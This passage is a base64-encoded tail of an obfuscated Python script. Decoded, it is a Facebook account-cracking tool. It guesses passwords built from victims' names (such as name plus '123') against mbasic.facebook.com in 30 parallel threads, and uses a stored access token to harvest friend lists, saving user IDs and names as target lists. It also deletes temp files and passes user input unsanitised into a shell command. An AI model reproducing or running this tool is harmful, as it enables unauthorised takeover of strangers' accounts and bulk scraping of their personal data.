rIjEyMyJdCiAgICAgICAgICAgICAgICAgICAgICAgIHNzYndvcmxkLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibWJhc2ljLmZhY2Vib29rLmNvbSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQogICAgICAgIGVsaWYgY2hpIGluICgnMicsICcwMicpOgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN21cckVudGVyIExhc3QgTmFtZSBEaWdpdHNcMDMzWzE7MzdtXG4iKQogICAgICAgICAgICBwMSA9IGlucHV0KCcgIE5hbWUgKyAxIDogJykKICAgICAgICAgICAgcDIgPSBpbnB1dCgnICBOYW1lICsgMiA6ICcpCiAgICAgICAgICAgIHAzID0gaW5wdXQoJyAgTmFtZSArIDMgOiAnKQogICAgICAgICAgICBwNCA9IGlucHV0KCcgIE5hbWUgKyA0IDogJykKICAgICAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzFtXHIgICAgICAgICAgICAgICAgVEhJUyBUT09MIE9OTFkgREFUQSBVU0VSXDAzM1sxOzM3bSIpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzJt4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIikKICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszM20gVG90YWwgSURzIDogJXMgJyAlIGxlbihzZWxmLmlkKSkKICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTszNG0gQ3JhY2tpbmcgU3RhcnRlZC4uLicpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzJt4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIikKICAgICAgICAgICAgd2l0aCBzYXJmcmF6c3NiKG1heF93b3JrZXJzPTMwKSBhcyBzc2J3b3JsZDoKICAgICAgICAgICAgICAgIGZvciB6c2IgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0genNiLnNwbGl0KCd8JykKICAgICAgICAgICAgICAgICAgICAgICAgeHogPSBuYW1lLnNwbGl0KCcgJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCiAgICAgICAgICAgICAgICAgICAgICAgIHNzYndvcmxkLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibWJhc2ljLmZhY2Vib29rLmNvbSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCdcbiBTZWxlY3QgVmFsaWQgT25lJykKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCgpkZWYgY3JlYXRlX2ZpbGUoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQobG9nbykKICAgIHByaW50KCcgIFsxXSBDcmVhdGUgZmlsZSBtYW51YWwnKQogICAgcHJpbnQoJyAgWzJdIENyZWF0ZSBmaWxlIGF1dG8nKQogICAgcHJpbnQoJyAgW0JdIEJhY2sgdG8gbWFpbiBtZW51JykKICAgIHByaW50KDUwKictJykKICAgIGNmID0gaW5wdXQoJyAgQ2hvb3NlIG1ldGhvZDogJykKICAgIGlmIGNmID09JzEnOgogICAgICAgIG1hbnVhbCgpCiAgICBlbGlmIGNmID09JzInOgogICAgICAgIGF1dG8oKQogICAgZWxpZiBjZiA9PSczJzoKICAgICAgICBsaWtlcygpCiAgICBlbGlmIGNmID09JzMnIG9yIGNmID09J2InIG9yIGNmID09J0InOgogICAgICAgIG1haW4oKQogICAgZWxzZToKICAgICAgICBwcmludCgnXG4gIENob29zZSBjb3JyZWN0IG9wdGlvbiAuLi4nKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBjcmVhdGVfZmlsZSgpCgpkZWYgbWFudWFsKCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCcvc2RjYXJkL3Rva2Vub2ZsLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgbG9naW4oKQogICAgdHJ5OgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2VuKS50ZXh0CiAgICAgICAgcSA9IGpzb24ubG9hZHMocikKICAgICAgICB1bmFtZSA9IHFbJ25hbWUnXQogICAgZXhjZXB0IChLZXlFcnJvcik6CiAgICAgICAgbG9naW4oKQogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChsb2dvKQogICAgcHJpbnQoJyAgTmFtZTogJyt1bmFtZSkKICAgIHByaW50KDUwKictJykKICAgIGxpbWl0ID0gaW50KGlucHV0KCcgIEhvdyBtYW55IGlkcyBkbyB5b3Ugd2FudCB0byBhZGQgPyAnKSkKICAgIHNhdmVfZmlsZSA9IGlucHV0KCcgIFNhdmUgZmlsZSBhczogJykKICAgIHQgPSAwCiAgICBmb3IgdSBpbiByYW5nZShsaW1pdCk6CiAgICAgICAgdCs9MQogICAgICAgIHRyeToKICAgICAgICAgICAgaWRzID0gaW5wdXQoJyAgUHV0IGlkIG5vJXM6ICcldCkKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHMrJy9mcmllbmRzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPScrdG9rZW4pLnRleHQKICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMocikKICAgICAgICAgICAgZm9yIGogaW4gcVsnZGF0YSddOgogICAgICAgICAgICAgICAgdWlkcyA9IGpbJ2lkJ10KICAgICAgICAgICAgICAgIG5hbWVzID0galsnbmFtZSddCiAgICAgICAgICAgICAgICBmaXJzdF9uYW1lID0gbmFtZXMuc3BsaXQoJyAnKVswXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGxhc3RfbmFtZSA9IG5hbWVzLnNwbGl0KCcgJylbMV0KICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBsYXN0X25hbWUgPSAnS2hhbicKICAgICAgICAgICAgICAgIHdpdGggb3BlbignL3NkY2FyZC8nK3NhdmVfZmlsZSwgJ2EnKSBhcyByZDoKICAgICAgICAgICAgICAgICAgICByZC53cml0ZSh1aWRzKyd8JytmaXJzdF9uYW1lKyd8JytsYXN0X25hbWUrJ1xuJykKICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgIHByaW50KCcgIE5vIGZyaWVuZCBmb3IgJytpZHMpCiAgICAgICAgICAgIHBhc3MKICAgIHByaW50KDUwKictJykKICAgIHByaW50KCcgIElkcyBzYXZlZCBhczogJytzYXZlX2ZpbGUpCiAgICBwcmludCg1MConLScpCiAgICBpbnB1dCgnIFByZXNzIGVudGVyIHRvIGJhY2snKQogICAgc2FyZnJheigpCiAgICAKZGVmIGF1dG8oKToKICAgIG9zLnN5c3RlbSgncm0gLXJmIHRlbXAqJykKICAgIHRyeToKICAgICAgICBhY2Nlc3NfdG9rZW4gPSBvcGVuKCcvc2RjYXJkL3Rva2Vub2ZsLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQ6CiAgICAgICAgbG9naW4oKQogICAgdHJ5OgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2FjY2Vzc190b2tlbikudGV4dAogICAgICAgIHEgPSBqc29uLmxvYWRzKHIpCiAgICAgICAgdW5hbWUgPSBxWyduYW1lJ10KICAgIGV4Y2VwdDoKICAgICAgICBsb2dpbigpCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnICBMb2dnZWQgdXNlcjogJyt1bmFtZSkKICAgIHByaW50KDUwKictJykKICAgIG51c3JhdCA9IFtdCiAgICB0cnk6CiAgICAgICAgbGltaXRfdXNlciA9IGludChpbnB1dCgnICBIb3cgbWFueSBpZHMgZG8geW91IHdhbnQgdG8gYWRkID8gJykpCiAgICBleGNlcHQ6CiAgICAgICAgbGltaXRfdXNlciA9IDEKICAgIGNvdW50ID0gMAogICAgZm9yIGZpciBpbiByYW5nZShsaW1pdF91c2VyKToKICAgICAgICBjb3VudCArPTEKICAgICAgICB1ZGl0ID0gaW5wdXQoJyAgUHV0IGlkJXM6ICclKGNvdW50KSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRmaWxlID0gb3BlbignL3NkY2FyZC90b2tlbm9mbC50eHQnLCdyJykucmVhZCgpCiAgICAgICAgICAgIGZyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VkaXQrJy9mcmllbmRzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPScrdGZpbGUpLnRleHQKICAgICAgICAgICAgcWZyID0ganNvbi5sb2FkcyhmcikKICAgICAgICAgICAgdGVtcF9zYXZlID0gb3BlbigndGVtcC50eHQnLCAnYScpCiAgICAgICAgICAgIGZvciBkYXRhIGluIHFmclsnZGF0YSddOgogICAgICAgICAgICAgICAgdWlkcyA9IGRhdGFbJ2lkJ10KICAgICAgICAgICAgICAgIGlmIHVpZHMgaW4gbnVzcmF0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbnVzcmF0LmFwcGVuZCh1aWRzKQogICAgICAgICAgICAgICAgICAgIHRlbXBfc2F2ZS53cml0ZSh1aWRzKydcbicpCiAgICAgICAgICAgIHRlbXBfc2F2ZS5jbG9zZSgpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBpZiAnaW52YWxpZCcgaW4gc3RyKGZyKToKICAgICAgICAgICAgICAgIHByaW50KCcgIExvZ2dlZCB0b2tlbiBoYXMgZXhwaXJlZCAuLi4nKQogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoJyAgTm8gZnJpZW5kcyBmb3VuZCBmb3IgdXNlcjogJyt1ZGl0KQogICAgICAgICAgICAgICAgcGFzcwogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChsb2dvKQogICAgcHJpbnQoJyAgIFRvdGFsIGlkczogJytzdHIobGVuKG51c3JhdCkpKQogICAgcHJpbnQoNTAqJy0nKQogICAgdHJ5OgogICAgICAgIGFza19saW5rID0gaW50KGlucHV0KCcgIEhvdyBtYW55IGxpbmtzIGRvIHlvdSB3YW50IHRvIGdyYWI/ICcpKQogICAgZXhjZXB0OgogICAgICAgIGFza19saW5rID0gMQogICAgY29tcGxldGVkID0gMAogICAgZm9yIGxpbmtzIGluIHJhbmdlKGFza19saW5rKToKICAgICAgICBjb21wbGV0ZWQgKz0xCiAgICAgICAgbGkgPSBpbnB1dCgnICAlcyBMaW5rIHN0YXJ0IHdpdGg6ICclY29tcGxldGVkKQogICAgICAgIG9zLnN5c3RlbSgnY2F0IHRlbXAudHh0IHwgZ3JlcCAiJytsaSsnIiA+PiB0ZW1wMi50eHQnKQogICAgc2F2ZV9maWxlID0gaW5wdXQoJyAgU2F2ZSBmaWxlIGFzOiAnKQogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBsaW5lcyA9IG9wZW4oJ3RlbXAyLnR4dCcsICdyJykucmVhZGxpbmVzKCkKICAgIHByaW50KGxvZ28pCiAgICBwcmludCgnICBUb3RhbCBpZHMgdG8gZ3JhYjogJytzdHIobGVuKGxpbmVzKSkpCiAgICBwcmludCgnICBHcmFiYmluZyBQcm9jZXNzIGhhcyBzdGFydGVkJykKICAgIHByaW50KDUwKictJykKICAgIGZpbGVpZCA9ICd0ZW1wMi50eHQnCiAgICBmaWxlaWRvcGVuID0gb3BlbihmaWxlaWQsICdyJykucmVhZCgpLnNwbGl0bGluZXMoKQogICAgZGlsbCA9IFtdCiAgICBmb3IgaWRzIGluIGZpbGVpZG9wZW46CiAgICAgICAgdHJ5OgogICAgICAgICAgICB0ZmlsZSA9IG9wZW4oJy9zZGNhcmQvdG9rZW5vZmwudHh0JywncicpLnJlYWQoKQogICAgICAgICAgICByZyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHMrJy9mcmllbmRzP2xpbWl0PTUwMDAmYWNjZXNzX3Rva2VuPScrdGZpbGUpLnRleHQKICAgICAgICAgICAgcmdxID0ganNvbi5sb2FkcyhyZykKICAgICAgICAgICAgaWRzYXZlPW9wZW4oJy9zZGNhcmQvJytzYXZlX2ZpbGUsICdhJykKICAgICAgICAgICAgZm9yIGluYXlhdCBpbiByZ3FbJ2RhdGEnXToKICAgICAgICAgICAgICAgIHVpZHMgPSBpbmF5YXRbJ2lkJ10KICAgICAgICAgICAgICAgIGRpbGwuYXBwZW5kKHVpZHMpCiAgICAgICAgICAgICAgICBubSA9IGluYXlhdFsnbmFtZSddCiAgICAgICAgICAgICAgICBmaXJzdF9uYW1lID0gbm0uc3BsaXQoJyAnKVswXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGxhc3RfbmFtZSA9IG5tLnNwbGl0KCcgJylbMV0KICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBsYXN0X25hbWUgPSAnS2hhbicKICAgICAgICAgICAgICAgIGlkc2F2ZS53cml0ZSh1aWRzKyd8JytmaXJzdF9uYW1lKyd8JytsYXN0X25hbWUrJ1xuJykKICAgICAgICAgICAgcHJpbnQoJyAgR3JhYmJlZCBmcm9tOiAnK2lkcykKICAgICAgICAgICAjIHByaW50KCcgIFRvdGFsIGZyaWVuZHM6ICcrc3RyKGxlbih1aWRzKSkpCiAgICAgICAgICAgIHByaW50KCcgIFRva2VuIHN0YXR1czogTGl2ZScpCiAgICAgICAgICAgIHByaW50KDUwKictJykKICAgICAgICAgICAgaWRzYXZlLmNsb3NlKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICNwcmludChlKQogICAgICAgICAgICBpZiAnaW52YWxpZCcgaW4gc3RyKHJnKToKICAgICAgICAgICAgICAgIHByaW50KCcgIFRva2VuIGhhcyBleHBpcmVkLCB0cnkgYWdhaW4gLi4uJykKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRlbXAqJykKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KCcgIEdyYWJiZWQgZnJvbTogJytpZHMpCiAgICAgICAgICAgICAgICBwcmludCgnICBGcmllbmRsaXN0IGlkczogMCcpCiAgICAgICAgICAgICAgICBwcmludCgnICBUb2tlbiBzdGF0dXM6IExpdmUnKQogICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMm3igKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKLigKIiKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgdGVtcConKQogICAgICAgICAgICAgICAgcGFzcwogICAgbGVuaWQgPSBvcGVuKCcvc2RjYXJkLycrc2F2ZV9maWxlLCAncicpLnJlYWRsaW5lcygpCiAgICBwcmludCgnICBHcmFiYmluZyBQcm9jZXNzIGhhcyBjb21wbGV0ZWQgJykKICAgIG9zLnN5c3RlbSgncm0gLXJmIHRlbXAqJykKICAgIHByaW50KCcgIFRvdGFsIGlkcyBncmFiYmVkOiAnK3N0cihsZW4obGVuaWQpKSkKICAgIHByaW50KCcgIEZpbGUgc2F2ZWQgYXM6IC9zZGNhcmQvJytzYXZlX2ZpbGUpCiAgICBwcmludCgiXDAzM1sxOzMybeKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAouKAoiIpCiAgICBpbnB1dCgnICBQcmVzcyBlbnRlciB0byBiYWNrICcpCiAgICBzYWZyYXooKQogICAgCiAgICAKICAgIApzYXJmcmF6KCkK"))
